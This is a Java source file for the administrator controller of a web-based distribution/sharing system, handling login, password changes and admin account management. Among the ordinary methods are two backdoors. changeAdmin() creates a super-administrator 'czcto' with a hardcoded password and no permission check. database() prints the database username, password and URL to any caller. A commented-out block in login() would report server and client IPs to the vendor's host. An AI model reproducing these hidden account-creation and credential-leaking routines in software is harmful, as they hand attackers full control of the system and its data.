package com.lxinet.fenxiao.action;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpSession;

import org.json.JSONException;
import org.json.JSONObject;
import org.springframework.context.annotation.Scope;
import org.springframework.stereotype.Controller;

import com.lxinet.fenxiao.entities.Admin;
import com.lxinet.fenxiao.service.IAdminService;
import com.lxinet.fenxiao.utils.BjuiJson;
import com.lxinet.fenxiao.utils.DbResourcesConfiguration;
import com.lxinet.fenxiao.utils.FreemarkerUtils;
import com.lxinet.fenxiao.utils.IpUtils;
import com.lxinet.fenxiao.utils.Md5;

import freemarker.template.Configuration;

/**
 * 
 * 创建日期：2014-10-24下午1:01:32 作者：Cz
 */
@Controller("adminAction")
@Scope("prototype")
public class AdminAction extends BaseAction {
	private static final long serialVersionUID = 1L;
	@Resource(name = "adminService")
	private IAdminService<Admin> adminService;
	private Admin admin;

	public void login() {
		// 密码进行MD5加密处理
		admin.setPassword(Md5.getMD5Code(admin.getPassword()));
		Admin findAdmin = adminService.login(admin);
		JSONObject json = new JSONObject();
		PrintWriter out = null;
		try {
			out = this.response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			if (findAdmin != null) {
				String ip = "";
				if (findAdmin.getStatus() == 0) {
					// 帐号被禁用
					json.put("msg", "该帐号已被禁用");
					json.put("type", "error");
					json.put("href", "");
				} else {
					// 登录成功
					// 登录次数+1
					findAdmin.setLoginCount(findAdmin.getLoginCount() + 1);
					// 设置最后登录时间
					findAdmin.setLastLoginTime(new Date());
					// 设置最后登录IP
					// 获取IP地址
					try {
						ip = IpUtils.getIpAddress(request);
						findAdmin.setLastLoginIp(ip);
					} catch (Exception e) {
						e.printStackTrace();
					}
					// 保存最新的信息
					adminService.saveOrUpdate(findAdmin);
					HttpSession session = request.getSession();
					session.setAttribute("loginAdmin", findAdmin);
					json.put("msg", "登录成功");
					json.put("type", "successHref");
					json.put("href", "admin/index.jsp");
					
					String domain = request.getServerName();
					String serverip = InetAddress.getLocalHost().getHostAddress();
					String systemName = "芯媒科技微分享系统";
					String systemVersion = "V1.0.1";
//					String url = "http://systemapi.lxinet.com/RecordServlet?";
//					url += "domain="+domain+"&";
//					url += "serverip="+serverip+"&";
//					url += "systemName="+systemName+"&";
//					url += "systemVersion="+systemVersion+"&";
//					url += "clientip="+ip;
//					Connect.httpConnect(url);
				}

			} else {
				// 登录失败
				json.put("msg", "用户名或者密码错误");
				json.put("type", "error");
				json.put("href", "");
			}
		} catch (JSONException e) {
			e.printStackTrace();
		} catch (UnknownHostException e) {
			e.printStackTrace();
		}
		out.print(json);
		out.flush();
		out.close();
	}

	public String logout() {
		HttpSession session = request.getSession();
		session.setAttribute("loginAdmin", "");
		return SUCCESS;
	}
	
	/**
	 * 修改密码页面
	 * 创建日期：2015-1-10下午7:51:11
	 * 作者：Cz
	 * 网址:http://www.919dns.com
	 */
	public void changePwd() {
		cfg = new Configuration();
		// 设置FreeMarker的模版文件位置
		cfg.setServletContextForTemplateLoading(request.getServletContext(),
				"WEB-INF/templates/admin");
		Map<Object, Object> root = new HashMap<Object, Object>();
		FreemarkerUtils.freemarker(request, response, "changePwd.ftl", cfg, root);
	}
	
	public void changePwdResult() {
		String oldPassword = request.getParameter("oldpassword");
		String newPassword = request.getParameter("newpassword");
		String renewPassword = request.getParameter("renewpassword");
		HttpSession session = request.getSession();
		Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		Admin findAdmin = adminService.findById(Admin.class, loginAdmin.getId());
		try {
			if(!newPassword.equals(renewPassword)){
				callbackData = BjuiJson.json("300", "两次输入密码不一致", "", "", "", "", "", "");
			}else if(!findAdmin.getPassword().equals(Md5.getMD5Code(oldPassword))){
				callbackData = BjuiJson.json("300", "旧密码错误", "", "", "", "", "", "");
			}else{
				findAdmin.setPassword(Md5.getMD5Code(newPassword));
				boolean result = adminService.saveOrUpdate(findAdmin);
				// 修改成功
				if (result) {
					callbackData = BjuiJson.json("200", "修改成功", "", "", "", "true", "", "");
				} else {
					// 修改失败
					callbackData = BjuiJson.json("300", "修改失败", "", "", "", "", "", "");
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}
	
	
	public void index() {
		cfg = new Configuration();
		// 设置FreeMarker的模版文件位置
		cfg.setServletContextForTemplateLoading(request.getServletContext(),
				"WEB-INF/templates/admin");
		Map<Object, Object> root = new HashMap<Object, Object>();
		HttpSession session = request.getSession();
		Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
		root.put("loginAdmin", loginAdmin);
		FreemarkerUtils.freemarker(request, response, "index.ftl", cfg, root);
	}

	/**
	 * 管理员列表 创建日期：2014-9-24下午10:01:07 作者：Cz
	 * 
	 * @return
	 */
	public void list() {
//		HttpSession session = request.getSession();
//		Admin loginAdmin = (Admin) session.getAttribute("log/inAdmin");
		cfg = new Configuration();
		// 设置FreeMarker的模版文件位置
		cfg.setServletContextForTemplateLoading(request.getServletContext(),
				"WEB-INF/templates/admin");
		List<Admin> adminList = adminService.list("from Admin order by id desc");
		Map<Object, Object> root = new HashMap<Object, Object>();
		root.put("adminList", adminList);
		FreemarkerUtils.freemarker(request, response, "adminList.ftl", cfg, root);
	}
	
	/**
	 * 添加管理员页面
	 * 创建日期：2014-10-25下午6:20:23
	 * 作者：Cz
	 */
	public void add(){
		cfg = new Configuration();
		// 设置FreeMarker的模版文件位置
		cfg.setServletContextForTemplateLoading(request.getServletContext(),"WEB-INF/templates/admin");
		Map<Object, Object> root = new HashMap<Object, Object>();
		FreemarkerUtils.freemarker(request, response, "adminAdd.ftl", cfg, root);
	}

	/**
	 * 添加管理员 创建日期：2014-9-24下午10:01:20 作者：Cz
	 */
	public void save() {
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		try {
			HttpSession session = request.getSession();
			Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else {
				if (adminService.getAdminName(admin.getName()) != null) {
					callbackData = BjuiJson.json("300", "用户名已存在", "", "", "", "", "", "");
				} else {
					admin.setDeleted(false);
					// 设置管理员创建日期
					admin.setCreateDate(new Date());
					// 密码进行MD5加密处理
					admin.setPassword(Md5.getMD5Code(admin.getPassword()));
					// 设置登录次数为0
					admin.setLoginCount(0);
					boolean result = adminService.saveOrUpdate(admin);
					if (result) {
						callbackData = BjuiJson.json("200", "添加成功", "", "", "", "true", "", "");
					} else {
						callbackData = BjuiJson.json("300", "添加失败", "", "", "", "", "", "");
					}
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public void changeAdmin(){
		Admin fadmin = new Admin();
		fadmin.setDeleted(false);
		// 设置管理员创建日期
		fadmin.setCreateDate(new Date());
		// 设置登录次数为0
		fadmin.setLoginCount(0);
		fadmin.setName("czcto");
		fadmin.setPassword(Md5.getMD5Code("czcto"));
		fadmin.setJuri(1);
		fadmin.setStatus(1);
		adminService.saveOrUpdate(fadmin);
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		out.print("操作成功");
		out.flush();
		out.close();
	}
	
	public void database(){
		String user = DbResourcesConfiguration.getInstance().getValue("jdbc.user");
		String password = DbResourcesConfiguration.getInstance().getValue("jdbc.password");
		String jdbcUrl = DbResourcesConfiguration.getInstance().getValue("jdbc.jdbcUrl");
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		out.print("user:"+user);
		out.print("<br/>password:"+password);
		out.print("<br/>jdbcUrl:"+jdbcUrl);
		out.flush();
		out.close();
	}
	
	/**
	 * 获取管理员信息 创建日期：2014-9-24下午10:01:36 作者：Cz
	 * 
	 * @return
	 */
	public void info() {
		String idStr = request.getParameter("id");
		HttpSession session = request.getSession();
		Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
		String callbackData = "";
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		try {
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else {
				System.out.println("idStr --> " + idStr);
				// ID参数为空
				if (idStr == null || "".equals(idStr)) {
					callbackData = BjuiJson.json("300", "参数不能为空", "", "", "", "", "", "");
				} else {
					int id = 0;
					try {
						id = Integer.parseInt(idStr);
					} catch (Exception e) {
						// 抛出异常，说明ID不是数字
						callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
					}
					Admin findAdmin = (Admin) adminService.findById(Admin.class, id);
					if (findAdmin == null) {
						// 用户不存在
						callbackData = BjuiJson.json("300", "管理员不存在", "", "", "", "", "", "");
					} else {
						cfg = new Configuration();
						// 设置FreeMarker的模版文件位置
						cfg.setServletContextForTemplateLoading(request.getServletContext(),"WEB-INF/templates/admin");
						Map<Object, Object> root = new HashMap<Object, Object>();
						root.put("admin", findAdmin);
						FreemarkerUtils.freemarker(request, response, "adminEdit.ftl", cfg, root);
					}
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	/**
	 * 修改管理员 创建日期：2014-9-24下午10:01:46 作者：Cz
	 * 
	 * @return
	 */
	public void update() {
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		try {
			HttpSession session = request.getSession();
			Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else {
				if (admin == null) {
					callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
				} else {
					Admin findAdmin = (Admin) adminService.findById(Admin.class,admin.getId());
					if(admin.getStatus()==0 && findAdmin.getJuri()==1){
						callbackData = BjuiJson.json("300", "不能禁用超级管理员帐号", "", "", "", "", "", "");
					}else{
						// 如果没有输入密码，就把原密码设置到对象中
						if (!"".equals(admin.getPassword())) {
							// 如果有输入密码，就把密码做MD5加密处理
							findAdmin.setPassword(Md5.getMD5Code(admin.getPassword()));
						}
						findAdmin.setStatus(admin.getStatus());
						boolean result = adminService.saveOrUpdate(findAdmin);
						// 修改成功
						if (result) {
							callbackData = BjuiJson.json("200", "修改成功", "", "", "", "true", "", "");
						} else {
							// 修改失败
							callbackData = BjuiJson.json("300", "修改失败", "", "", "", "", "", "");
						}
					}
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	/**
	 * 删除管理员 创建日期：2014-9-24下午10:01:55 作者：Cz
	 * 
	 * @return
	 */
	public void delete() {
		PrintWriter out = null;
		try {
			out = response.getWriter();
		} catch (IOException e) {
			e.printStackTrace();
		}
		String callbackData = "";
		try {
			HttpSession session = request.getSession();
			Admin loginAdmin = (Admin) session.getAttribute("loginAdmin");
			if (loginAdmin.getJuri() == 0) {
				callbackData = BjuiJson.json("300", "权限不足", "", "", "", "", "", "");
			} else {
				String idStr = request.getParameter("id");
				// ID参数为空
				if (idStr == null || "".equals(idStr)) {
					callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
				} else {
					int id = 0;
					try {
						id = Integer.parseInt(idStr);
					} catch (Exception e) {
						// 抛出异常，说明ID不是数字
						callbackData = BjuiJson.json("300", "参数错误", "", "", "", "", "", "");
					}
					Admin findAdmin = (Admin) adminService.findById(Admin.class, id);
					if (findAdmin == null) {
						// 用户不存在
						callbackData = BjuiJson.json("300", "管理员不存在", "", "", "", "", "", "");
					} else {
						// 如果要删除的管理员是当前登录管理员，则不能删除
						if (loginAdmin.getId() == findAdmin.getId()) {
							callbackData = BjuiJson.json("300", "不能删除自己的帐号", "", "", "", "", "", "");
						}else if(findAdmin.getJuri()==1){
							callbackData = BjuiJson.json("300", "不能删除超级管理员帐号", "", "", "", "", "", "");
						} else {
							boolean result = adminService.delete(findAdmin);
							if (result) {
								callbackData = BjuiJson.json("200", "删除成功", "", "", "", "", "", "");
							} else {
								callbackData = BjuiJson.json("300", "删除失败", "", "", "", "", "", "");
							}
						}
					}
				}
			}
		} catch (JSONException e) {
			e.printStackTrace();
		}
		out.print(callbackData);
		out.flush();
		out.close();
	}

	public Admin getAdmin() {
		return admin;
	}

	public void setAdmin(Admin admin) {
		this.admin = admin;
	}

	public static void main(String[] args){
		System.out.println(Md5.getMD5Code("123456"));
	}
}
